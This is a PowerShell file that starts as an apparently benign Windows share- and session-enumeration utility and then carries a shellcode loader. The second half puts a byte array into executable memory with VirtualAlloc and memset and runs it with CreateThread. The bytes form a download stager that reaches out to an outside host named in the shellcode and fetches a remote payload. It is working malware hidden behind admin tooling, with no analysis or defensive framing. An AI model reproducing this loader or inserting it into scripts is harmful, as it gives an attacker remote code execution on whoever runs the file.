function Get-NetShare {[CmdletBinding()]param([string]$HostName = 'localhost')If ($PSBoundParameters['Debug']) {$DebugPreference = 'Continue'}$QueryLevel = 1$ptrInfo = [IntPtr]::Zero$EntriesRead = 0$TotalRead = 0$ResumeHandle = 0$Result = $Netapi32::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)$offset = $ptrInfo.ToInt64()Write-Debug "Get-NetShare result: $Result"if (($Result -eq 0) -and ($offset -gt 0)) {$Increment = $SHARE_INFO_1::GetSize()for ($i = 0; ($i -lt $EntriesRead); $i++){$newintptr = New-Object system.Intptr -ArgumentList $offset$Info = $newintptr -as $SHARE_INFO_1$Info | Select-Object *$offset = $newintptr.ToInt64()$offset += $increment}$Netapi32::NetApiBufferFree($ptrInfo) | Out-Null}else {switch ($Result) {(5)           {Write-Debug 'The user does not have access to the requested information.'}(124)         {Write-Debug 'The value specified for the level parameter is not valid.'}(87)          {Write-Debug 'The specified parameter is not valid.'}(234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}(8)           {Write-Debug 'Insufficient memory is available.'}(2312)        {Write-Debug 'A session does not exist with the computer name.'}(2351)        {Write-Debug 'The computer name is not valid.'}(2221)        {Write-Debug 'Username not found.'}(53)          {Write-Debug 'Hostname could not be found'}}}}$Mod = New-InMemoryModule -ModuleName Win32$FunctionDefinitions = @((func netapi32 NetSessionEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),(func netapi32 NetApiBufferFree ([Int]) @([IntPtr])))$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{sesi10_cname = field 0 String -MarshalAs @('LPWStr')sesi10_username = field 1 String -MarshalAs @('LPWStr')sesi10_time = field 2 UInt32sesi10_idle_time = field 3 UInt32}$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'$Netapi32 = $Types['netapi32']$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x5b,0x11,0x00,0x00,0xe8,0xb3,0x00,0x00,0x00,0x2f,0x77,0x54,0x56,0x57,0x6e,0x6b,0x78,0x6f,0x56,0x6f,0x49,0x5a,0x54,0x78,0x68,0x4f,0x54,0x7a,0x44,0x4d,0x44,0x41,0x4c,0x70,0x79,0x58,0x41,0x42,0x6b,0x76,0x61,0x42,0x51,0x57,0x64,0x45,0x32,0x38,0x68,0x4c,0x7a,0x6b,0x51,0x6c,0x79,0x37,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4f,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x6c,0x69,0x7a,0x61,0x6e,0x6f,0x76,0x61,0x2e,0x7a,0x61,0x70,0x74,0x6f,0x2e,0x6f,0x72,0x67,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};